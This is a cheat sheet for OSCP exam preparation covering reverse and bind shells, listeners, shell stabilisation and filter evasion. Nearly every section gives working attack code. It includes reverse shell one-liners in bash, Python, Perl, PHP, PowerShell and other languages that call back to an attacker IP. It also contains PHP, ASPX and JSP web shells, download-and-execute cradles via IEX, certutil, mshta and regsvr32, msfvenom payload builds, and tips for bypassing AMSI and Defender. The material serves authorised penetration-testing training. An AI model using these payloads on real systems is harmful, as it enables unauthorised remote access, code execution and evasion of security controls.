# Reverse Shells

Comprehensive playbook for getting and stabilizing reverse shells during the OSCP exam.

---

## Table of Contents
1. [Workflow Overview](#workflow)
2. [Listeners on Kali](#listeners)
3. [Linux Reverse Shells](#linux)
4. [Windows Reverse Shells](#windows)
5. [Web / Language-Specific Payloads](#web)
6. [msfvenom Payloads](#msfvenom)
7. [Bind Shells (when reverse is blocked)](#bind)
8. [Shell Stabilization / TTY Upgrade](#stabilize)
9. [Encoding & Evasion for Restricted Inputs](#encoding)
10. [Gotchas & Troubleshooting](#gotchas)
11. [Quick-Reference Cheat Card](#cheatcard)

---

<a id="workflow"></a>
## 1. Workflow Overview

The standard loop for every box:

1. **Pick a listener** on Kali (`nc -lvnp 443` for quick, `rlwrap nc` for editable, `pwncat-cs` for auto-upgraded).
2. **Pick a payload** matching the target (OS, language, what's installed).
3. **Deliver** through the foothold (web form, command injection, SQLi, file upload, etc.).
4. **Stabilize** the shell (TTY upgrade — section 8).
5. **Enumerate** for privesc.

**Port choice matters.** Egress filters often allow only 80/443/53. Try 443 first if you don't know. Listening on 443 needs `sudo`.

---

<a id="listeners"></a>
## 2. Listeners on Kali

### netcat (bread and butter)
```bash
nc -lvnp 4444
# -l listen, -v verbose, -n no DNS, -p port
```

### rlwrap netcat (arrow keys, history, less broken)
```bash
rlwrap nc -lvnp 4444
# Up-arrow to repeat commands, Ctrl+C survives, much nicer
```

### ncat (TLS-capable, OpenBSD-nc lacks --ssl)
```bash
ncat -lvnp 4444
ncat --ssl -lvnp 443           # TLS reverse shell (encrypts traffic)
```

### pwncat-cs (auto-stabilizes, persistence, file ops built in)
```bash
pip3 install pwncat-cs
pwncat-cs -lp 4444
# Auto-upgrades TTY, has built-in `download`, `upload`, enumeration
```

### Metasploit multi/handler
```bash
msfconsole -q -x "use exploit/multi/handler; \
  set PAYLOAD linux/x64/shell_reverse_tcp; \
  set LHOST tun0; set LPORT 4444; \
  set ExitOnSession false; run -j"
```
Match the PAYLOAD to whatever msfvenom generated. Common ones:
- `windows/x64/shell_reverse_tcp` — staged
- `windows/x64/shell/reverse_tcp` — stageless
- `windows/x64/meterpreter/reverse_tcp` — meterpreter (note: only allowed in OSCP on ONE box)

### socat (TTY-aware listener)
```bash
socat -d -d file:`tty`,raw,echo=0 tcp-listen:4444
# Pairs with a socat reverse shell — gives full TTY immediately
```

---

<a id="linux"></a>
## 3. Linux Reverse Shells

Set these variables in your head every time:
- `LHOST` / `IP` = your Kali (usually `tun0`)
- `LPORT` / `PORT` = your listener port

### bash (most universal)
```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
# If `bash -i` is filtered:
0<&196;exec 196<>/dev/tcp/10.10.14.5/4444; sh <&196 >&196 2>&196
```

**Gotcha:** `&` and `>` are special in URLs — must be URL-encoded if going through a browser (`%26`, `%3E`).
**Gotcha:** `/bin/sh -c "bash -i >& /dev/tcp/..."` often fails because `sh` (dash) doesn't grok `>&`. Always wrap in `bash -c`.

### sh / dash (when bash isn't there)
```bash
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
# Or pure POSIX:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f
```

### netcat
```bash
# Traditional nc with -e
nc -e /bin/bash 10.10.14.5 4444
nc -e /bin/sh   10.10.14.5 4444

# nc without -e (OpenBSD/most modern distros)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f

# ncat
ncat 10.10.14.5 4444 -e /bin/bash
ncat --ssl 10.10.14.5 443 -e /bin/bash
```

### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# python3 equivalent — same thing, may need `python3` binary
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
**Gotcha:** `pty.spawn` here means you get a near-full PTY out of the gate — no need for the `stty raw -echo` dance.

### perl
```bash
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### ruby
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### php
```bash
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### socat (instant full TTY)
```bash
# Listener:  socat -d -d file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

### awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/10.10.14.5/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){while ((c |& getline) > 0) print $0 |& s; close(c);} } while(c != "exit") close(s); }}' /dev/null
```

### Telnet (last-ditch)
```bash
mknod /tmp/backpipe p
telnet 10.10.14.5 4444 0</tmp/backpipe | /bin/bash 1>/tmp/backpipe
```

### lua
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.10.14.5','4444');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

---

<a id="windows"></a>
## 4. Windows Reverse Shells

### nc.exe (classic — needs upload first)
```cmd
nc.exe -e cmd.exe 10.10.14.5 4444
nc64.exe -e powershell.exe 10.10.14.5 4444
```
**Gotcha:** Defender flags `nc.exe`. Use renamed/rebuilt versions (`nc64.exe` from Nishang, or compile yourself).

### PowerShell — Nishang Invoke-PowerShellTcp (most popular)
```powershell
# On Kali, append the call to the script:
echo 'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 4444' >> Invoke-PowerShellTcp.ps1
# Serve via http.server, then on target:
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-PowerShellTcp.ps1')"
```

### PowerShell — inline one-liner (no script needed)
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()
```

**Encoded variant for command injection (safe to paste):**
```bash
# On Kali:
PS='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()'
echo -n "$PS" | iconv -t UTF-16LE | base64 -w0
```
```cmd
powershell -nop -w hidden -ep bypass -enc <BASE64>
```

### PowerShell — PowerCat (more reliable, supports TLS)
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/powercat.ps1')
powercat -c 10.10.14.5 -p 4444 -e cmd
powercat -c 10.10.14.5 -p 4444 -e powershell
powercat -c 10.10.14.5 -p 4444 -e cmd -ep                # encoded
```

### mshta (signed binary — bypasses some AppLocker)
```bash
# Generate with msfvenom (see section 6) and serve.
# On target:
mshta http://10.10.14.5/shell.hta
```

### rundll32 / regsvr32 (LOLBAS)
```cmd
regsvr32 /s /n /u /i:http://10.10.14.5/shell.sct scrobj.dll
```

### certutil + exe drop
```cmd
certutil -urlcache -split -f http://10.10.14.5/shell.exe %TEMP%\s.exe && %TEMP%\s.exe
```

### conhost (when interactive needed)
```cmd
conhost.exe powershell.exe -nop -c "<reverse shell>"
```

### Powershell flags (recap)
| Flag | Purpose |
|------|---------|
| `-nop` | No profile |
| `-ep bypass` | Skip exec policy |
| `-w hidden` | No window |
| `-NonInteractive` | No prompts |
| `-enc` | Base64 UTF-16LE command |
| `-c` | Inline command string |

**Canonical PS reverse shell launcher:**
`powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/r.ps1')"`

---

<a id="web"></a>
## 5. Web / Language-Specific Payloads

### PHP web shells (file upload / LFI → RFI)

**Simple cmd executor:**
```php
<?php system($_GET['c']); ?>
<?php echo shell_exec($_GET['c']); ?>
<?php passthru($_GET['c']); ?>
```

**One-line reverse trigger via shell:**
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"); ?>
```

**Pentest Monkey PHP reverse shell** — drop `php-reverse-shell.php` (in Kali at `/usr/share/webshells/php/`) and edit IP/port.

**Gotcha:** If `system`, `exec`, `shell_exec` are disabled via `disable_functions`, try `proc_open`, `popen`, `assert`, `preg_replace /e`, or use a pure-PHP reverse shell via `fsockopen`.

### ASP / ASPX (IIS uploads)
```aspx
<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %>
<% Process p = new Process(); p.StartInfo.FileName="cmd.exe"; p.StartInfo.Arguments="/c "+Request["c"]; p.StartInfo.RedirectStandardOutput=true; p.StartInfo.UseShellExecute=false; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
```
Kali ships `/usr/share/webshells/aspx/cmdasp.aspx`.

### JSP (Tomcat)
```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
String c=request.getParameter("c");
Process p=Runtime.getRuntime().exec(c);
BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
String l; while((l=br.readLine())!=null) out.println(l);
%>
```
For full revshell, use msfvenom JSP/WAR payload (section 6).

### Node.js
```javascript
require('child_process').exec('bash -i >& /dev/tcp/10.10.14.5/4444 0>&1')
// SSJS injection
(function(){var net = require("net"), cp = require("child_process"), sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(4444, "10.10.14.5", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});})();
```

### Java
```java
Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"});
```

---

<a id="msfvenom"></a>
## 6. msfvenom Payloads

Template:
```bash
msfvenom -p <PAYLOAD> LHOST=10.10.14.5 LPORT=4444 -f <FORMAT> -o <OUT>
```

### Common payloads
```bash
# Linux x64 ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o sh.elf

# Linux x86 (older boxes)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o sh32.elf

# Windows x64 EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o s.exe

# Windows x86 EXE (Buffer overflow box pattern)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o s32.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f dll -o s.dll

# ASPX
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o s.aspx

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o s.war

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o s.jsp

# PHP
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o s.php
# Then prepend <?php and append ?> if missing

# Python
msfvenom -p cmd/unix/reverse_python LHOST=10.10.14.5 LPORT=4444 -f raw

# Bash
msfvenom -p cmd/unix/reverse_bash LHOST=10.10.14.5 LPORT=4444 -f raw

# Powershell (raw cmd)
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=4444

# HTA (mshta)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hta-psh -o s.hta

# MSI installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f msi -o s.msi

# Shellcode for BOF (raw bytes, no badchars)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 EXITFUNC=thread -f c -b "\x00\x0a\x0d"
```

### Staged vs stageless
- `linux/x64/shell_reverse_tcp` → **stageless** (one chunk, more bytes, more reliable)
- `linux/x64/shell/reverse_tcp` → **staged** (small initial, fetches second stage; needs `multi/handler`)

**OSCP rule:** Match the payload exactly when setting up `multi/handler`, including the slash convention.

### Flags worth knowing
| Flag | Purpose |
|------|---------|
| `-p` | Payload |
| `-f` | Output format (exe, elf, raw, c, py, hex, war, asp, aspx, hta-psh, msi, vba, vbs) |
| `-o` | Output file (alternative to `>`) |
| `-b` | Bad chars to avoid (BOF) |
| `-e` | Encoder (e.g., `x86/shikata_ga_nai`) |
| `-i` | Encoder iterations |
| `-a` | Architecture (x86, x64) |
| `--platform` | Target platform (windows, linux) |
| `EXITFUNC=thread` | Avoid crashing host service in BOF |
| `-x template.exe` | Embed in legit binary |
| `-k` | Keep template running (for `-x`) |

---

<a id="bind"></a>
## 7. Bind Shells (when reverse is blocked)

Use when outbound is filtered but inbound to a port on the target is allowed.

### Listener (attacker)
```bash
nc -nv TARGET_IP 4444
```

### Linux bind
```bash
# nc with -e
nc -lvp 4444 -e /bin/bash

# without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l 4444 >/tmp/f

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);c,_=s.accept();[os.dup2(c.fileno(),fd) for fd in (0,1,2)];import pty;pty.spawn("/bin/bash")'
```

### Windows bind
```cmd
nc.exe -lvp 4444 -e cmd.exe

# msfvenom
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind.exe
```
Matching MSF handler: `windows/x64/shell_bind_tcp`, `set RHOST <target>`.

---

<a id="stabilize"></a>
## 8. Shell Stabilization / TTY Upgrade

A raw `nc` shell breaks on `su`, `ssh`, `vi`, `sudo`, Ctrl+C kills it. Upgrade it.

### Linux — full stabilization (canonical 4-step)
```bash
# 1. In the shell, spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# (or python -c, or script -qc /bin/bash /dev/null, or `/usr/bin/script -qc /bin/bash /dev/null`)

# 2. Background the shell
Ctrl+Z

# 3. On Kali, set the local terminal raw, no echo
stty raw -echo; fg
# (then press Enter twice)

# 4. In the shell, fix terminal type and size
export TERM=xterm
export SHELL=bash
stty rows 50 columns 200
# Find your local size first with `stty size` on Kali
```

Now Ctrl+C, arrow keys, `sudo`, `vi`, etc. all work.

### Alternative PTY spawners (in priority order)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
python  -c 'import pty;pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null
script /dev/null -c bash
/usr/bin/expect -c 'spawn bash; interact'
socat exec:bash,pty,stderr,setsid,sigint,sane tcp:<KALI>:4445  # second listener
perl -e 'exec "/bin/bash";'
```

### socat fully-interactive (no upgrade needed)
```bash
# Listener:
socat -d -d file:`tty`,raw,echo=0 tcp-listen:4444
# Reverse:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.5:4444
```

### Windows — there's no TTY upgrade
- `cmd.exe` and `powershell.exe` work fine over `nc`.
- For richer interaction, use `evil-winrm`, `psexec`, or `wmiexec` after creds.
- Some interactive Windows commands (`runas /netonly`) need a real console — use **conhost.exe** wrapper or a meterpreter session.

```cmd
conhost.exe powershell.exe
```

### Common stabilization gotchas
- **Forgetting `fg` after `stty raw -echo`** — your local terminal goes dark and unresponsive. Type `reset` blindly.
- **`stty: standard input: Inappropriate ioctl`** — the shell isn't a TTY yet. Run the python `pty.spawn` first.
- **`xterm` not found** — `export TERM=xterm-256color` or `linux`.
- **Tabs print escape codes** — terminal isn't really raw. Re-run the stabilization dance.

---

<a id="encoding"></a>
## 9. Encoding & Evasion for Restricted Inputs

### URL encoding (web foothold)
| char | encoded |
|------|---------|
| space | `%20` or `+` |
| `&` | `%26` |
| `?` | `%3F` |
| `;` | `%3B` |
| `/` | `%2F` |
| `\n` | `%0a` |
| `\r\n` | `%0d%0a` |

### Bypassing filters
```bash
# Spaces filtered:
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
X=$'\x20';cat${X}/etc/passwd

# Slashes filtered (PATH):
cd /etc; cat passwd
$0<passwd                       # read via redirection

# Specific char blocked:
b''ash -i...                   # empty quotes
ba\sh -i...                    # backslash
ba''sh -i...
$(echo YmFzaCAtaQ==|base64 -d)

# Wildcards instead of names:
/???/??sh -i                    # /bin/bash
/???/?at /etc/passwd            # /bin/cat
```

### Base64-wrap a payload
```bash
echo -n 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64
# bash -c "{echo,BASE64HERE}|{base64,-d}|bash"
```

### PowerShell `-enc` (UTF-16LE required)
```bash
cmd='IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/r.ps1")'
echo -n "$cmd" | iconv -t UTF-16LE | base64 -w0
# Use: powershell -nop -ep bypass -enc <blob>
```

### Bad-char-safe shellcode (BOF)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d" -f python -v shellcode
```

---

<a id="gotchas"></a>
## 10. Gotchas & Troubleshooting

### "I sent the payload but no callback"
- Wrong interface IP — confirm `tun0` vs `eth0`. `ip a`.
- Listener on wrong port.
- Firewall outbound on target — try port 80, 443, 53.
- Listener on Kali firewall-blocked — `sudo ufw allow 4444`.
- Payload arch mismatch (32-bit binary on 64-bit no-multilib).
- Defender ate it — switch to in-memory PS (`IEX`).
- Quotes mangled by the injection point — try base64.

### "Callback connects but shell dies instantly"
- Staged payload + wrong handler config — use stageless.
- Service runs as `nobody` and target has no `/bin/bash` — try `sh`.
- Bad chars in shellcode you didn't filter.
- AV killed child process — try a parent process that survives (e.g., spawn under `cmd.exe /c start`).

### "Shell connects but commands don't run / hang"
- It's a half-duplex pipe — you need to upgrade TTY.
- The shell is `rbash` — escape with `vi`, `awk`, `find -exec`, or interpreters (`python -c "import pty; pty.spawn('/bin/sh')"`).
- Output is buffered — append `2>&1` or `; echo done`.

### "Ctrl+C kills my reverse shell"
- You haven't stabilized. See section 8.
- Use `rlwrap nc` so Ctrl+C is intercepted locally.

### Windows-specific
- `powershell` blocked but `pwsh` (PowerShell Core) might be present.
- Constrained Language Mode breaks most one-liners — use a `runas` to a different user, or stick to `cmd`.
- AMSI blocks known scripts by content. Obfuscate strings, rename functions, or download in chunks. The `IEX (DownloadString)` pattern reads to memory before AMSI inspects in some old PS versions.
- Defender real-time scan on disk: write to memory only (`IEX`), or write to AV-allowed paths like user profile temp.
- `Invoke-WebRequest` first call is slow because IE first-run config — for the exam, prefer `Net.WebClient`.
- `sysnative` vs `system32` (see File-Transfers gotchas).

### Listener housekeeping
- One listener per shell. If `nc -lvnp 4444` says **already in use**, you forgot to close a previous one.
- After catching a shell, you can't reuse the same `nc` listener — start a new one if you expect more.

---

<a id="cheatcard"></a>
## 11. Quick-Reference Cheat Card

```text
LISTENERS
  rlwrap nc -lvnp 443
  ncat --ssl -lvnp 443
  pwncat-cs -lp 4444
  socat -d -d file:`tty`,raw,echo=0 tcp-listen:4444

LINUX REVERSE
  bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'
  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",PORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
  perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

WINDOWS REVERSE
  powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/r.ps1')"
  powershell -nop -ep bypass -enc <BASE64-UTF16LE>
  nc64.exe -e cmd.exe IP PORT

MSFVENOM
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o s.exe
  msfvenom -p linux/x64/shell_reverse_tcp   LHOST=IP LPORT=PORT -f elf -o s.elf

STABILIZE LINUX SHELL
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  ^Z
  stty raw -echo; fg
  export TERM=xterm; stty rows 50 columns 200

PS FLAGS
  -nop -w hidden -ep bypass -enc <b64>      # safe canonical launcher

PORTS TO TRY (in order)  443  80  53  4444
```

**Memorize these three lines:**
```bash
# Linux
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Windows
powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/r.ps1')"

# TTY upgrade
python3 -c 'import pty;pty.spawn("/bin/bash")' ; Ctrl+Z ; stty raw -echo; fg
```
